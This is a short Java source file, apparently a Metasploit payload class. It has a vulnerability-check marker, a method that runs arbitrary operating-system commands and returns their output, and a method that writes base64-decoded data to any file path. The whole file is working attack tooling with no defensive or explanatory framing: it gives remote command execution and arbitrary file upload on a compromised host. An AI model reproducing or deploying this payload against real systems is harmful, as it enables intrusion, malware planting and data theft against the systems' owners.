package metasploit;

import java.io.*;

import sun.misc.BASE64Decoder;

public class Payload
{
	public static String check() {
		return "###VULNERABLE###";
	}
	
	public static String exec(String cmd)
	{
		try
		{
			String s = "";
			byte[] bf = new byte[4096];

			BufferedInputStream bis = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
			int len = 0;
			while ((len = bis.read(bf, 0, 4096)) != -1)
			{
				s = s + new String(bf, 0, len);
			}
			bis.close();
			return s;
		}
		catch (Exception e)
		{
			return e.getMessage();
		}
	}
	
	public static String upload(String R, String file_name) {
		try {
			BASE64Decoder decoder = new BASE64Decoder();
			byte[] bt = decoder.decodeBuffer(R);
			FileOutputStream fi = new FileOutputStream(file_name);
			fi.write(bt);
			fi.close();
			return "BINGO";
		} catch (Exception e) {
			return e.getMessage();
		}
	}

	public static void main(String[] args)
	{
		System.out.print(exec(args[0]));
	}
}
